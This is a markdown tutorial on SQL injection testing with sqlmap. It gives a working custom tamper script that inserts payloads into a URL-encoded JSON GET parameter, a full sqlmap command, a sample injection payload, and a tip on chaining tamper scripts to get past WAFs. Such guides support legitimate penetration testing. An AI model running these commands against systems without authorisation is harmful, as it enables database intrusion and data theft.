# SQLMap Injection with Custom Tamper Script for JSON in URL-Encoded GET Parameter

## Table of Contents

* Goal
* Scenario
* Custom Tamper Script
* SQLMap Usage
* Example
* Tips and Considerations
* References

---

## Goal

Use `sqlmap` to perform SQL injection on a URL-encoded JSON object passed as a GET parameter. The JSON will contain a `"%s"` placeholder where the SQL payload will be injected. A custom tamper script will insert the payload and URL-encode the final JSON string.

---

## Scenario

Target URL example:

```
http://target.com/api/user?data=%7B%22id%22%3A%22%s%22%7D
```

Decoded value of the `data` parameter:

```json
{"id": "%s"}
```

We want `sqlmap` to inject into the `id` field inside the JSON string.

---

## Custom Tamper Script

Create a Python tamper script to be used by `sqlmap`. This script will replace `%s` with the payload, and URL-encode the resulting JSON string.

Save the following code as `json_urlencode_s_placeholder.py` in the `tamper/` directory of your `sqlmap` installation.

```python
# tamper/json_urlencode_s_placeholder.py

import urllib.parse
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    Replace %s in a JSON template with the payload, and URL-encode the result.
    Template: {"id": "%s"}
    """
    if not payload:
        return payload

    json_template = '{"id": "%s"}'
    injected = json_template % payload
    encoded = urllib.parse.quote(injected)
    return encoded
```

This script performs the following steps:

1. Inserts the payload into the `{"id": "%s"}` template.
2. URL-encodes the complete JSON string.
3. Returns the encoded string for use in the GET request.

---

## SQLMap Usage

Run `sqlmap` using the tamper script with the following command:

```bash
sqlmap -u "http://target.com/api/user?data=%7B%22id%22%3A%22%s%22%7D" \
--tamper=json_urlencode_s_placeholder \
--method=GET \
--level=5 --risk=3 \
--batch
```

In some cases, `sqlmap` may not recognize `%s` as the injection point. If that happens, use a placeholder like `INJECT_HERE` in the URL and modify the tamper script to replace that instead of `%s`.

---

## Example

Input URL to `sqlmap`:

```
http://target.com/api/user?data=%7B%22id%22%3A%22%s%22%7D
```

When `sqlmap` injects a payload like:

```
1' OR '1'='1
```

The tamper script transforms it into:

```json
{"id": "1' OR '1'='1"}
```

Which becomes URL-encoded as:

```
%7B%22id%22%3A%221%27%20OR%20%271%27%3D%271%22%7D
```

Final request:

```
http://target.com/api/user?data=%7B%22id%22%3A%221%27%20OR%20%271%27%3D%271%22%7D
```

---

## Tips and Considerations

* The `%s` placeholder must be inside double quotes in the JSON string.
* Use `--skip-urlencode` if you want to avoid additional encoding by `sqlmap`.
* Use a proxy (`--proxy=http://127.0.0.1:8080`) with a tool like Burp Suite to verify requests.
* Combine this tamper script with others for bypassing filters or WAFs if necessary.
* Use `--flush-session` if previous testing data is cached and causing issues.

---

## References

* [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
* [https://github.com/sqlmapproject/sqlmap/wiki/Tamper-scripts](https://github.com/sqlmapproject/sqlmap/wiki/Tamper-scripts)
* [https://owasp.org/www-community/attacks/JSON\_Injection](https://owasp.org/www-community/attacks/JSON_Injection)
